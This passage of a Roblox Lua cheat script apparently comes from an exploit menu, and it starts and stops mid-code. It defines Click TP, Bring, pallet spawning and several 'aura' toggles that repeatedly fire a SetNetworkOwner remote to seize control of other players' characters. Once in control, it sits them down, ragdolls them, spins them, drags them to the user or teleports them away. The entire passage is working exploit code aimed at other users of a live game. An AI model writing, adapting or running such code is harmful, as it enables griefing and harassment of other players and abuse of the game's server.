                                            local character = tpzContro or localPlayer.Character

                                            if character then
                                                local tpzContro2 = tbl2.TPZContro
                                                local str2 = tpzContro2 and "Head"

                                                if not str2 then
                                                    local character2 = localPlayer.Character
                                                    str2 = character2 and "CamPart" or nil
                                                end

                                                if str2 and character:FindFirstChild(str2) then
                                                    local v46, v47 = obj.Workspace:FindPartOnRayWithIgnoreList(Ray.new(character[str2].Position, localPlayer.Character.CamPart.CFrame.lookVector * 5000), {character})

                                                    if v46 and character:FindFirstChild("HumanoidRootPart") then
                                                        character.HumanoidRootPart.CFrame = CFrame.new(v47.X, v47.Y + 3, v47.Z)
                                                    end
                                                end
                                            end
                                        elseif tbl2.TPZholdCn then
                                            tbl2.TPZholdCn:Disconnect()
                                            tbl2.TPZholdCn = nil
                                        end
                                    end)
                                end
                            end
                        end)

                        tbl2.MobileTPUpCon = imageButton2.MouseButton1Up:Connect(function()
                            if tbl2.TPMode == "ClickTP (Hold)" then
                                tbl2.holdtoggletp = false

                                if tbl2.TPZholdCn then
                                    tbl2.TPZholdCn:Disconnect()
                                    tbl2.TPZholdCn = nil
                                end
                            end
                        end)

                        tbl2.MobileTPLeaveCon = imageButton2.MouseLeave:Connect(function()
                            if tbl2.TPMode == "ClickTP (Hold)" then
                                tbl2.holdtoggletp = false

                                if tbl2.TPZholdCn then
                                    tbl2.TPZholdCn:Disconnect()
                                    tbl2.TPZholdCn = nil
                                end
                            end
                        end)

                        tbl2.MobileTPClickCon = imageButton2.MouseButton1Click:Connect(function()
                            if tbl2.TPMode == "ClickTP" and tbl2.ClickTPfutuu then
                                local tpzContro = tbl2.TPZContro
                                local character = tpzContro or localPlayer.Character

                                if character then
                                    local tpzContro2 = tbl2.TPZContro
                                    local str2 = tpzContro2 and "Head"

                                    if not str2 then
                                        local character2 = localPlayer.Character
                                        str2 = character2 and "CamPart" or nil
                                    end

                                    if str2 and character:FindFirstChild(str2) then
                                        local v46, v47 = obj.Workspace:FindPartOnRayWithIgnoreList(Ray.new(character[str2].Position, localPlayer.Character.CamPart.CFrame.lookVector * 5000), {character})

                                        if v46 and character:FindFirstChild("HumanoidRootPart") then
                                            character.HumanoidRootPart.CFrame = CFrame.new(v47.X, v47.Y + 3, v47.Z)
                                        end
                                    end
                                end
                            end
                        end)
                    else
                        tbl2.TPZcon = obj.UserInputService.InputBegan:Connect(function(input, gameProcessed)
                            if gameProcessed then
                                return
                            end

                            if input.KeyCode == tbl2.ClickTPKey and tbl2.ClickTPfutuu then
                                if tbl2.TPMode == "ClickTP" then
                                    local tpzContro = tbl2.TPZContro
                                    local character = tpzContro or localPlayer.Character

                                    if character then
                                        local tpzContro2 = tbl2.TPZContro
                                        local str2 = tpzContro2 and "Head"

                                        if not str2 then
                                            local character2 = localPlayer.Character
                                            str2 = character2 and "CamPart" or nil
                                        end

                                        if str2 and character:FindFirstChild(str2) then
                                            local v46, v47 = obj.Workspace:FindPartOnRayWithIgnoreList(Ray.new(character[str2].Position, localPlayer.Character.CamPart.CFrame.lookVector * 5000), {character})

                                            if v46 and character:FindFirstChild("HumanoidRootPart") then
                                                character.HumanoidRootPart.CFrame = CFrame.new(v47.X, v47.Y + 3, v47.Z)
                                            end
                                        end
                                    end
                                elseif tbl2.TPMode == "ClickTP (Hold)" then
                                    tbl2.holdtoggletp = true

                                    if not tbl2.TPZholdCn then
                                        tbl2.TPZholdCn = obj.RunService.Heartbeat:Connect(function()
                                            if tbl2.holdtoggletp and tbl2.ClickTPfutuu then
                                                local tpzContro = tbl2.TPZContro
                                                local character = tpzContro or localPlayer.Character

                                                if character then
                                                    local tpzContro2 = tbl2.TPZContro
                                                    local str2 = tpzContro2 and "Head"

                                                    if not str2 then
                                                        local character2 = localPlayer.Character
                                                        str2 = character2 and "CamPart" or nil
                                                    end

                                                    if str2 and character:FindFirstChild(str2) then
                                                        local v46, v47 = obj.Workspace:FindPartOnRayWithIgnoreList(Ray.new(character[str2].Position, localPlayer.Character.CamPart.CFrame.lookVector * 5000), {character})

                                                        if v46 and character:FindFirstChild("HumanoidRootPart") then
                                                            character.HumanoidRootPart.CFrame = CFrame.new(v47.X, v47.Y + 3, v47.Z)
                                                        end
                                                    end
                                                end
                                            elseif tbl2.TPZholdCn then
                                                tbl2.TPZholdCn:Disconnect()
                                                tbl2.TPZholdCn = nil
                                            end
                                        end)
                                    end
                                end
                            end
                        end)

                        tbl2.TPZconall = obj.UserInputService.InputEnded:Connect(function(input, gameProcessed)
                            if input.KeyCode == tbl2.ClickTPKey then
                                tbl2.holdtoggletp = false

                                if tbl2.TPZholdCn then
                                    tbl2.TPZholdCn:Disconnect()
                                    tbl2.TPZholdCn = nil
                                end
                            end
                        end)
                    end
                end
            end,
        })

        keybinds:AddLabel("Click TP Key"):AddKeyPicker("ClickTPKeybind", {
            Default = "Z",
            Mode = "Press",
            Modes = {"Press"},
            Text = "Click TP Key",
            Callback = function(arg) end,
            ChangedCallback = function(clickTPKey, arg)
                if typeof(clickTPKey) == "EnumItem" and clickTPKey.EnumType == Enum.KeyCode then
                    tbl2.ClickTPKey = clickTPKey

                    if tbl2.ClickTPfutuu and keybinds.Toggles and keybinds.Toggles.ClickTPZ then
                        keybinds.Toggles.ClickTPZ:SetValue(true)
                    end
                end
            end,
        })

        keybinds:AddToggle("BringG", {
            Text = "Bring",
            Default = false,
            Callback = function(bringToggleValue)
                tbl2.BringToggleValue = bringToggleValue

                if not BringToggleData then
                    BringToggleData = {KeyConnection = nil, ButtonConnection = nil}
                end

                local v46 = BringToggleData

                if v46.KeyConnection then
                    v46.KeyConnection:Disconnect()
                    v46.KeyConnection = nil
                end

                if v46.ButtonConnection then
                    v46.ButtonConnection:Disconnect()
                    v46.ButtonConnection = nil
                end

                screenGui.Parent = PlayerGui

                if bringToggleValue then
                    imageButton.Visible = true
                    imageButton.Active = true
                    imageLabel.Visible = true

                    if obj.UserInputService.TouchEnabled then
                        v46.ButtonConnection = imageButton.MouseButton1Click:Connect(function()
                            task.spawn(function()
                                local playerGui2 = localPlayer:FindFirstChild("PlayerGui")
                                if not playerGui2 then
                                    return
                                end
                                local crosshairs = playerGui2:FindFirstChild("Crosshairs")
                                if not crosshairs then
                                    return
                                end

                                if not crosshairs:FindFirstChild("CrosshairsFrame") then
                                    return
                                end
                                local currentCamera = obj.Workspace.CurrentCamera
                                local position = currentCamera.CFrame.Position
                                local n2 = currentCamera.CFrame.LookVector * 1000
                                local raycastParams = RaycastParams.new()
                                raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
                                raycastParams.FilterDescendantsInstances = {localPlayer.Character}
                                local hit = obj.Workspace:Raycast(position, n2, raycastParams)
                                if not hit then
                                    return
                                end
                                local instance = hit.Instance
                                if not instance then
                                    return
                                end
                                local tbl11 = {Map = true, Plots = true, Waypoints = true, Slots = true}
                                local parent = instance

                                while parent and parent ~= obj.Workspace do
                                    if tbl11[parent.Name] then
                                        return
                                    end
                                    parent = parent.Parent
                                end

                                local v47 = getCharacter()
                                local humanoidRootPart = v47 and v47:FindFirstChild("HumanoidRootPart")
                                if not humanoidRootPart then
                                    return
                                end
                                local model = instance:FindFirstAncestorWhichIsA("Model")
                                local flag = false

                                if model and model:FindFirstChildOfClass("Humanoid") then
                                    flag = true
                                end

                                if model and flag then
                                    local torso = model:FindFirstChild("Torso")
                                    local upperTorso = torso or model:FindFirstChild("UpperTorso")
                                    local head_ = model:FindFirstChild("Head")
                                    if not upperTorso or not humanoidRootPart then
                                        return
                                    end

                                    if (humanoidRootPart.Position - upperTorso.Position).Magnitude > 99999 then
                                        return
                                    end

                                    if upperTorso and upperTorso.Parent then
                                        Struggle:FireServer()
                                        local flag2 = false

                                        task.spawn(function()
                                            while true do
                                                task.wait(0.01)
                                                local partOwner_ = upperTorso:FindFirstChild("PartOwner")
                                                if partOwner_ and partOwner_.Value == localPlayer.Name then
                                                    break
                                                end

                                                if flag2 then
                                                    return
                                                end
                                            end

                                            flag2 = true
                                        end)

                                        if (humanoidRootPart.Position - upperTorso.Position).Magnitude <= 24 then
                                            for i = 1, 12 do
                                                if flag2 then
                                                    break
                                                end
                                                SetNetworkOwner:FireServer(upperTorso, upperTorso.CFrame)
                                                task.wait(0.02)
                                            end

                                            task.spawn(function()
                                                repeat
                                                    task.wait()
                                                until head_ and not head_:IsGrounded() and head_.AssemblyRootPart.ReceiveAge == 0 or not model

                                                if humanoidRootPart and upperTorso then
                                                    upperTorso.CFrame = humanoidRootPart.CFrame * CFrame.new(0, 0, -4)
                                                    local humanoidRootPart2 = model:FindFirstChild("HumanoidRootPart")

                                                    if humanoidRootPart2 then
                                                        humanoidRootPart2.AssemblyLinearVelocity = Vector3.zero
                                                    end
                                                end
                                            end)
                                        else
                                            local cFrame = humanoidRootPart.CFrame
                                            task.wait(0.03)

                                            for i = 1, 18 do
                                                if flag2 then
                                                    break
                                                end
                                                local position2 = upperTorso.Position
                                                local assemblyLinearVelocity = upperTorso.AssemblyLinearVelocity

                                                if assemblyLinearVelocity.Magnitude >= 2 then
                                                    local n3 = obj.Stats.Network.ServerStatsItem["Data Ping"]:GetValue() / 1000 * 0.8 + 0.05
                                                    local vector = Vector3.new(0, -obj.Workspace.Gravity * 0.5, 0)
                                                    position2 = upperTorso.Position + assemblyLinearVelocity * n3 + vector * n3 * n3 * 0.5
                                                end

                                                humanoidRootPart.CFrame = CFrame.new(position2) * CFrame.new(0, 10, 0)
                                                task.wait(0.01)
                                                SetNetworkOwner:FireServer(upperTorso, upperTorso.CFrame)
                                            end

                                            task.wait(0.01)

                                            task.spawn(function()
                                                repeat
                                                    task.wait()
                                                until head_ and not head_:IsGrounded() and head_.AssemblyRootPart.ReceiveAge == 0 or not model

                                                if humanoidRootPart and upperTorso then
                                                    upperTorso.CFrame = humanoidRootPart.CFrame * CFrame.new(0, 0, -4)
                                                    local humanoidRootPart2 = model:FindFirstChild("HumanoidRootPart")

                                                    if humanoidRootPart2 then
                                                        humanoidRootPart2.AssemblyLinearVelocity = Vector3.zero
                                                    end
                                                end
                                            end)

                                            humanoidRootPart.CFrame = cFrame
                                        end

                                        flag2 = true
                                        DestroyGrabLine:FireServer(upperTorso)
                                    end
                                elseif instance and instance.Parent then
                                    if (humanoidRootPart.Position - instance.Position).Magnitude > 99999 then
                                        return
                                    end
                                    Struggle:FireServer()
                                    local flag2 = false

                                    task.spawn(function()
                                        while true do
                                            task.wait(0.01)
                                            local partOwner_ = instance:FindFirstChild("PartOwner")
                                            if partOwner_ and partOwner_.Value == localPlayer.Name then
                                                break
                                            end

                                            if flag2 then
                                                return
                                            end
                                        end

                                        flag2 = true
                                    end)

                                    if (humanoidRootPart.Position - instance.Position).Magnitude <= 29 then
                                        for i = 1, 12 do
                                            if flag2 then
                                                break
                                            end
                                            SetNetworkOwner:FireServer(instance, instance.CFrame)
                                            task.wait(0.02)
                                        end
                                    else
                                        local cFrame = humanoidRootPart.CFrame
                                        task.wait(0.03)

                                        for i = 1, 18 do
                                            if flag2 then
                                                break
                                            end
                                            local position2 = instance.Position
                                            local assemblyLinearVelocity = instance.AssemblyLinearVelocity

                                            if assemblyLinearVelocity.Magnitude >= 2 then
                                                local n3 = obj.Stats.Network.ServerStatsItem["Data Ping"]:GetValue() / 1000 * 0.8 + 0.05
                                                local vector = Vector3.new(0, -obj.Workspace.Gravity * 0.5, 0)
                                                position2 = instance.Position + assemblyLinearVelocity * n3 + vector * n3 * n3 * 0.5
                                            end

                                            humanoidRootPart.CFrame = CFrame.new(position2) * CFrame.new(0, 10, 0)
                                            task.wait(0.01)
                                            SetNetworkOwner:FireServer(instance, instance.CFrame)
                                        end

                                        task.wait(0.01)
                                        humanoidRootPart.CFrame = cFrame
                                    end

                                    flag2 = true

                                    repeat
                                        task.wait()
                                    until (function()
                                        local partOwner_ = instance:FindFirstChild("PartOwner")
                                        local flag3 = partOwner_ and partOwner_.Value == localPlayer.Name
                                        return flag3
                                    end)()

                                    if humanoidRootPart and instance.AssemblyRootPart then
                                        instance.AssemblyRootPart.CFrame = humanoidRootPart.CFrame + humanoidRootPart.CFrame.LookVector * 5
                                        DestroyGrabLine:FireServer(instance.AssemblyRootPart)
                                    end
                                end
                            end)
                        end)
                    else
                        v46.KeyConnection = obj.UserInputService.InputBegan:Connect(function(input, gameProcessed)
                            if not gameProcessed and input.KeyCode == tbl2.BringKey then
                                task.spawn(function()
                                    local playerGui2 = localPlayer:FindFirstChild("PlayerGui")
                                    if not playerGui2 then
                                        return
                                    end
                                    local crosshairs = playerGui2:FindFirstChild("Crosshairs")
                                    if not crosshairs then
                                        return
                                    end

                                    if not crosshairs:FindFirstChild("CrosshairsFrame") then
                                        return
                                    end
                                    local currentCamera = obj.Workspace.CurrentCamera
                                    local position = currentCamera.CFrame.Position
                                    local n2 = currentCamera.CFrame.LookVector * 1000
                                    local raycastParams = RaycastParams.new()
                                    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
                                    raycastParams.FilterDescendantsInstances = {localPlayer.Character}
                                    local hit = obj.Workspace:Raycast(position, n2, raycastParams)
                                    if not hit then
                                        return
                                    end
                                    local instance = hit.Instance
                                    if not instance then
                                        return
                                    end
                                    local tbl11 = {Map = true, Plots = true, Waypoints = true, Slots = true}
                                    local parent = instance

                                    while parent and parent ~= obj.Workspace do
                                        if tbl11[parent.Name] then
                                            return
                                        end
                                        parent = parent.Parent
                                    end

                                    local v47 = getCharacter()
                                    local humanoidRootPart = v47 and v47:FindFirstChild("HumanoidRootPart")
                                    if not humanoidRootPart then
                                        return
                                    end
                                    local model = instance:FindFirstAncestorWhichIsA("Model")
                                    local flag = false

                                    if model and model:FindFirstChildOfClass("Humanoid") then
                                        flag = true
                                    end

                                    if model and flag then
                                        local torso = model:FindFirstChild("Torso")
                                        local upperTorso = torso or model:FindFirstChild("UpperTorso")
                                        local head_ = model:FindFirstChild("Head")
                                        if not upperTorso or not humanoidRootPart then
                                            return
                                        end

                                        if (humanoidRootPart.Position - upperTorso.Position).Magnitude > 99999 then
                                            return
                                        end

                                        if upperTorso and upperTorso.Parent then
                                            Struggle:FireServer()
                                            local flag2 = false

                                            task.spawn(function()
                                                while true do
                                                    task.wait(0.01)
                                                    local partOwner_ = upperTorso:FindFirstChild("PartOwner")
                                                    if partOwner_ and partOwner_.Value == localPlayer.Name then
                                                        break
                                                    end

                                                    if flag2 then
                                                        return
                                                    end
                                                end

                                                flag2 = true
                                            end)

                                            if (humanoidRootPart.Position - upperTorso.Position).Magnitude <= 24 then
                                                for i = 1, 12 do
                                                    if flag2 then
                                                        break
                                                    end
                                                    SetNetworkOwner:FireServer(upperTorso, upperTorso.CFrame)
                                                    task.wait(0.02)
                                                end

                                                task.spawn(function()
                                                    repeat
                                                        task.wait()
                                                    until head_ and not head_:IsGrounded() and head_.AssemblyRootPart.ReceiveAge == 0 or not model

                                                    if humanoidRootPart and upperTorso then
                                                        upperTorso.CFrame = humanoidRootPart.CFrame * CFrame.new(0, 0, -4)
                                                        local humanoidRootPart2 = model:FindFirstChild("HumanoidRootPart")

                                                        if humanoidRootPart2 then
                                                            humanoidRootPart2.AssemblyLinearVelocity = Vector3.zero
                                                        end
                                                    end
                                                end)
                                            else
                                                local cFrame = humanoidRootPart.CFrame
                                                task.wait(0.03)

                                                for i = 1, 18 do
                                                    if flag2 then
                                                        break
                                                    end
                                                    local position2 = upperTorso.Position
                                                    local assemblyLinearVelocity = upperTorso.AssemblyLinearVelocity

                                                    if assemblyLinearVelocity.Magnitude >= 2 then
                                                        local n3 = obj.Stats.Network.ServerStatsItem["Data Ping"]:GetValue() / 1000 * 0.8 + 0.05
                                                        local vector = Vector3.new(0, -obj.Workspace.Gravity * 0.5, 0)
                                                        position2 = upperTorso.Position + assemblyLinearVelocity * n3 + vector * n3 * n3 * 0.5
                                                    end

                                                    humanoidRootPart.CFrame = CFrame.new(position2) * CFrame.new(0, 10, 0)
                                                    task.wait(0.01)
                                                    SetNetworkOwner:FireServer(upperTorso, upperTorso.CFrame)
                                                end

                                                task.wait(0.01)

                                                task.spawn(function()
                                                    repeat
                                                        task.wait()
                                                    until head_ and not head_:IsGrounded() and head_.AssemblyRootPart.ReceiveAge == 0 or not model

                                                    if humanoidRootPart and upperTorso then
                                                        upperTorso.CFrame = humanoidRootPart.CFrame * CFrame.new(0, 0, -4)
                                                        local humanoidRootPart2 = model:FindFirstChild("HumanoidRootPart")

                                                        if humanoidRootPart2 then
                                                            humanoidRootPart2.AssemblyLinearVelocity = Vector3.zero
                                                        end
                                                    end
                                                end)

                                                humanoidRootPart.CFrame = cFrame
                                            end

                                            flag2 = true
                                            DestroyGrabLine:FireServer(upperTorso)
                                        end
                                    elseif instance and instance.Parent then
                                        if (humanoidRootPart.Position - instance.Position).Magnitude > 99999 then
                                            return
                                        end
                                        Struggle:FireServer()
                                        local flag2 = false

                                        task.spawn(function()
                                            while true do
                                                task.wait(0.01)
                                                local partOwner_ = instance:FindFirstChild("PartOwner")
                                                if partOwner_ and partOwner_.Value == localPlayer.Name then
                                                    break
                                                end

                                                if flag2 then
                                                    return
                                                end
                                            end

                                            flag2 = true
                                        end)

                                        if (humanoidRootPart.Position - instance.Position).Magnitude <= 29 then
                                            for i = 1, 12 do
                                                if flag2 then
                                                    break
                                                end
                                                SetNetworkOwner:FireServer(instance, instance.CFrame)
                                                task.wait(0.02)
                                            end
                                        else
                                            local cFrame = humanoidRootPart.CFrame
                                            task.wait(0.03)

                                            for i = 1, 18 do
                                                if flag2 then
                                                    break
                                                end
                                                local position2 = instance.Position
                                                local assemblyLinearVelocity = instance.AssemblyLinearVelocity

                                                if assemblyLinearVelocity.Magnitude >= 2 then
                                                    local n3 = obj.Stats.Network.ServerStatsItem["Data Ping"]:GetValue() / 1000 * 0.8 + 0.05
                                                    local vector = Vector3.new(0, -obj.Workspace.Gravity * 0.5, 0)
                                                    position2 = instance.Position + assemblyLinearVelocity * n3 + vector * n3 * n3 * 0.5
                                                end

                                                humanoidRootPart.CFrame = CFrame.new(position2) * CFrame.new(0, 10, 0)
                                                task.wait(0.01)
                                                SetNetworkOwner:FireServer(instance, instance.CFrame)
                                            end

                                            task.wait(0.01)
                                            humanoidRootPart.CFrame = cFrame
                                        end

                                        flag2 = true

                                        repeat
                                            task.wait()
                                        until (function()
                                            local partOwner_ = instance:FindFirstChild("PartOwner")
                                            local flag3 = partOwner_ and partOwner_.Value == localPlayer.Name
                                            return flag3
                                        end)()

                                        if humanoidRootPart and instance.AssemblyRootPart then
                                            instance.AssemblyRootPart.CFrame = humanoidRootPart.CFrame + humanoidRootPart.CFrame.LookVector * 5
                                            DestroyGrabLine:FireServer(instance.AssemblyRootPart)
                                        end
                                    end
                                end)
                            end
                        end)
                    end
                else
                    imageButton.Visible = false
                    imageButton.Active = false
                    imageLabel.Visible = false
                end
            end,
        })

        keybinds:AddLabel("Bring Key"):AddKeyPicker("BringKeybind", {
            Default = "G",
            Mode = "Press",
            Modes = {"Press"},
            Text = "Bring Key",
            ChangedCallback = function(bringKey, arg)
                if typeof(bringKey) == "EnumItem" and bringKey.EnumType == Enum.KeyCode then
                    tbl2.BringKey = bringKey

                    if tbl2.BringToggleValue and keybinds.Toggles and keybinds.Toggles.BringG then
                        keybinds.Toggles.BringG:SetValue(true)
                    end
                end
            end,
        })

        keybinds:AddToggle("Spawn", {
            Text = "Spawn Pallet (Tab)",
            Default = false,
            Callback = function(arg)
                if tbl2.palletConn then
                    tbl2.palletConn:Disconnect()
                    tbl2.palletConn = nil
                end

                obj.ContextActionService:UnbindAction("Spawn Pallet (TAB)")
                screenGui3.Parent = PlayerGui

                if arg then
                    imageButton3.Visible = true
                    imageButton3.Active = true
                    imageLabel3.Visible = true

                    local function fn40()
                        local character = localPlayer.Character
                        if character and character:FindFirstChild("CamPart") then
                            return fn4("PalletLightBrown", character.CamPart.CFrame, Vector3.new(0, character.CamPart.Orientation.Y, 0))
                        end
                    end

                    if obj.UserInputService.TouchEnabled then
                        tbl2.palletConn = imageButton3.InputBegan:Connect(function(input, gameProcessed)
                            if not gameProcessed and input.UserInputType == Enum.UserInputType.Touch then
                                fn40()
                            end
                        end)
                    else
                        obj.ContextActionService:BindAction("Spawn Pallet (TAB)", function(arg2, arg3, arg4)
                            if arg2 == "Spawn Pallet (TAB)" and arg3 == Enum.UserInputState.Begin then
                                fn40()
                            end
                        end, false, Enum.KeyCode.Tab)
                    end
                else
                    imageButton3.Visible = false
                    imageButton3.Active = false
                    imageLabel3.Visible = false
                end
            end,
        })

        Auras:AddToggle("a455", {
            Text = "Whitelist",
            Default = tbl2.WhitelistFriends,
            Callback = function(whitelistFriends)
                tbl2.WhitelistFriends = whitelistFriends
            end,
        })

        Auras:AddToggle("a45", {
            Text = "Grab Aura",
            Default = false,
            Callback = function(arg)
                if tbl2.auraThread then
                    task.cancel(tbl2.auraThread)
                    tbl2.auraThread = nil
                end

                if not arg then
                    return
                end

                local function fn40(arg2, arg3)
                    local tbl11 = {}

                    for k, player in pairs(obj.Players:GetPlayers()) do
                        if fn7(player) then
                            local character = player.Character

                            if character then
                                local torso = character:FindFirstChild("Torso")
                                local humanoidRootPart = torso or character:FindFirstChild("HumanoidRootPart")

                                if humanoidRootPart and (humanoidRootPart.Position - arg2.Position).Magnitude <= arg3 then
                                    table.insert(tbl11, player)
                                end
                            end
                        end
                    end

                    return tbl11
                end

                tbl2.auraThread = task.spawn(function()
                    while arg do
                        local character = localPlayer.Character

                        if character then
                            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

                            if humanoidRootPart then
                                local v46 = fn40(humanoidRootPart, tbl2.auraRadius)

                                for k, v47 in pairs(v46) do
                                    task.spawn(function()
                                        local character2 = v47.Character

                                        if character2 then
                                            local torso = character2:FindFirstChild("Torso")
                                            local humanoidRootPart2 = torso or character2:FindFirstChild("HumanoidRootPart")

                                            if humanoidRootPart2 then
                                                if SetNetworkOwner then
                                                    pcall(function()
                                                        SetNetworkOwner:FireServer(humanoidRootPart2, character2.HumanoidRootPart.CFrame)
                                                    end)
                                                end

                                                local bodyVelocity = Instance.new("BodyVelocity")
                                                bodyVelocity.Parent = humanoidRootPart2
                                                bodyVelocity.Velocity = Vector3.zero
                                                bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                                obj.Debris:AddItem(bodyVelocity, 0.1)
                                            end
                                        end
                                    end)
                                end
                            end
                        end

                        task.wait(0.01)
                    end
                end)
            end,
        })

        Auras:AddToggle("a77", {
            Text = "Sit Aura",
            Default = false,
            Callback = function(sitAuraToggle)
                tbl2.SitAuraToggle = sitAuraToggle

                if tbl2.SitauraConnection then
                    tbl2.SitauraConnection:Disconnect()
                    tbl2.SitauraConnection = nil
                end

                if sitAuraToggle then
                    tbl2.SitauraConnection = obj.RunService.Heartbeat:Connect(function()
                        if not tbl2.SitAuraToggle then
                            return
                        end
                        local v46 = getPlayerCharacter()
                        local humanoidRootPart = v46 and getPlayerCharacter().HumanoidRootPart
                        if not humanoidRootPart then
                            return
                        end

                        for i, player in ipairs(obj.Players:GetPlayers()) do
                            if fn7(player) then
                                local character = player.Character

                                if character then
                                    local torso = character:FindFirstChild("Torso")
                                    local humanoid = character:FindFirstChildOfClass("Humanoid")

                                    if torso and humanoid and (torso.Position - humanoidRootPart.Position).Magnitude <= tbl2.auraRadius then
                                        SetNetworkOwner:FireServer(torso, humanoidRootPart.CFrame)
                                        humanoid.Sit = true
                                    end
                                end
                            end
                        end
                    end)
                end
            end,
        })

        Auras:AddToggle("a1", {
            Text = "Ragdoll Aura",
            Default = false,
            Callback = function(ragdollAuraToggle)
                tbl2.RagdollAuraToggle = ragdollAuraToggle

                if tbl2.RagdollAuraThread then
                    task.cancel(tbl2.RagdollAuraThread)
                    tbl2.RagdollAuraThread = nil
                end

                if ragdollAuraToggle then
                    tbl2.RagdollAuraThread = task.spawn(function()
                        while tbl2.RagdollAuraToggle do
                            local v46 = getPlayerCharacter()
                            local humanoidRootPart = v46 and getPlayerCharacter().HumanoidRootPart

                            if humanoidRootPart then
                                for i, player in ipairs(obj.Players:GetPlayers()) do
                                    if fn7(player) then
                                        local character = player.Character

                                        if character then
                                            local humanoidRootPart2 = character:FindFirstChild("HumanoidRootPart")

                                            if humanoidRootPart2 and (humanoidRootPart2.Position - humanoidRootPart.Position).Magnitude <= tbl2.auraRadius then
                                                SetNetworkOwner:FireServer(humanoidRootPart2, humanoidRootPart2.CFrame)
                                                humanoidRootPart2.AssemblyLinearVelocity = Vector3.new(0, -256, 0)
                                            end
                                        end
                                    end
                                end
                            end

                            task.wait(0.15)
                        end
                    end)
                end
            end,
        })

        Auras:AddToggle("a3", {
            Text = "Spin Aura",
            Default = false,
            Callback = function(spinAuraToggle)
                tbl2.spinAuraToggle = spinAuraToggle

                if tbl2.spinConnection then
                    task.cancel(tbl2.spinConnection)
                    tbl2.spinConnection = nil
                end

                if spinAuraToggle then
                    tbl2.spinConnection = task.spawn(function()
                        while tbl2.spinAuraToggle do
                            local v46 = getPlayerCharacter()
                            local humanoidRootPart = v46 and getPlayerCharacter().HumanoidRootPart

                            if humanoidRootPart then
                                for i, player in ipairs(obj.Players:GetPlayers()) do
                                    if fn7(player) ~= false then
                                        local character = player.Character

                                        if character then
                                            local torso = character:FindFirstChild("Torso")
                                            local humanoidRootPart2 = torso or character:FindFirstChild("HumanoidRootPart")

                                            if humanoidRootPart2 and (humanoidRootPart2.Position - humanoidRootPart.Position).Magnitude <= tbl2.auraRadius then
                                                SetNetworkOwner:FireServer(humanoidRootPart2, humanoidRootPart.CFrame)
                                                local spinForce = humanoidRootPart2:FindFirstChild("SpinForce")
                                                local bodyAngularVelocity = spinForce or Instance.new("BodyAngularVelocity")
                                                bodyAngularVelocity.Name = "SpinForce"
                                                bodyAngularVelocity.MaxTorque = Vector3.new(999999, 999999, 999999)
                                                bodyAngularVelocity.AngularVelocity = Vector3.new(0, tbl2.spinSpeed, 0)
                                                bodyAngularVelocity.Parent = humanoidRootPart2
                                            end
                                        end
                                    end
                                end
                            end

                            task.wait(0.05)
                        end
                    end)
                else
                    for i, player in ipairs(obj.Players:GetPlayers()) do
                        local character = player.Character

                        if character then
                            local torso = character:FindFirstChild("Torso")
                            local humanoidRootPart = torso or character:FindFirstChild("HumanoidRootPart")

                            if humanoidRootPart then
                                local spinForce = humanoidRootPart:FindFirstChild("SpinForce")

                                if spinForce then
                                    spinForce:Destroy()
                                end
                            end
                        end
                    end
                end
            end,
        })

        Auras:AddToggle("a2", {
            Text = "Bring Aura",
            Default = false,
            Callback = function(bringAura)
                tbl2.BringAura = bringAura

                if bringAura then
                    task.spawn(function()
                        while tbl2.BringAura do
                            for i, player in ipairs(obj.Players:GetPlayers()) do
                                if fn7(player) then
                                    local character = player.Character

                                    if character then
                                        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                                        local humanoid = character:FindFirstChildOfClass("Humanoid")
                                        local v46 = getPlayerCharacter()

                                        if humanoid and humanoidRootPart and v46 and v46:FindFirstChild("HumanoidRootPart") then
                                            local v47 = localPlayer:DistanceFromCharacter(humanoidRootPart.Position)

                                            if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") and v47 <= 30 then
                                                SetNetworkOwner:FireServer(humanoidRootPart, lookAt(localPlayer.Character.HumanoidRootPart.Position, humanoidRootPart.Position))
                                            end

                                            humanoid.Sit = false
                                            humanoid.WalkSpeed = 25
                                            humanoid:MoveTo(v46.HumanoidRootPart.Position)
                                        end
                                    end
                                end
                            end

                            task.wait()
                        end
                    end)
                end
            end,
        })

        Auras:AddToggle("a4", {
            Text = "Teleport Aura (Spawn)",
            Default = false,
            Callback = function(teleportAuraT)
                tbl2.TeleportAuraT = teleportAuraT

                if teleportAuraT then
                    tbl2.teleportCoro = coroutine.create(function()
                        local character, humanoidRootPart, v46, v47, v48, v49, v50, v51, humanoidRootPart2, vector, bodyPosition, bodyGyro, n2
                        n2 = 1

                        while true do
                            if n2 == 1 then
                                if task.wait(0.05) then
                                    n2 = 2
                                else
                                    n2 = 14
                                end
                            elseif n2 == 2 then
                                character = localPlayer.Character
                                humanoidRootPart = character

                                if character then
                                    n2 = 3
                                else
                                    n2 = 4
                                end
                            elseif n2 == 3 then
                                humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                                n2 = 4
                            elseif n2 == 4 then
                                if humanoidRootPart then
                                    n2 = 5
                                else
                                    n2 = 1
                                end
                            elseif n2 == 5 then
                                v46, v47, v48 = pairs(obj.Players:GetPlayers())
                                v49 = v48
                                n2 = 6
                            elseif n2 == 6 then
                                v50, v51 = v46(v47, v49)

                                if v50 == nil then
                                    n2 = 1
                                else
                                    n2 = 7
                                end
                            elseif n2 == 7 then
                                v49 = v50

                                if v51 == localPlayer then
                                    n2 = 6
                                else
                                    n2 = 8
                                end
                            elseif n2 == 8 then
                                humanoidRootPart2 = v51.Character:FindFirstChild("HumanoidRootPart")

                                if humanoidRootPart2 and (humanoidRootPart.Position - humanoidRootPart2.Position).Magnitude <= 30 then
                                    n2 = 9
                                else
                                    n2 = 6
                                end
                            elseif n2 == 9 then
                                pcall(function()
                                    SetNetworkOwner:FireServer(humanoidRootPart2, humanoidRootPart2.CFrame)
                                end)

                                vector = Vector3.new(0, 0, 0)
                                humanoidRootPart2.CFrame = CFrame.new(vector)

                                if tbl2.teleportBodie[v51] and tbl2.teleportBodie[v51].Parent then
                                    n2 = 10
                                else
                                    n2 = 11
                                end
                            elseif n2 == 10 then
                                tbl2.teleportBodie[v51]:Destroy()
                                n2 = 11
                            elseif n2 == 11 then
                                bodyPosition = Instance.new("BodyPosition")
                                bodyPosition.Name = "TeleportAuraBP"
                                bodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                bodyPosition.P = 50000
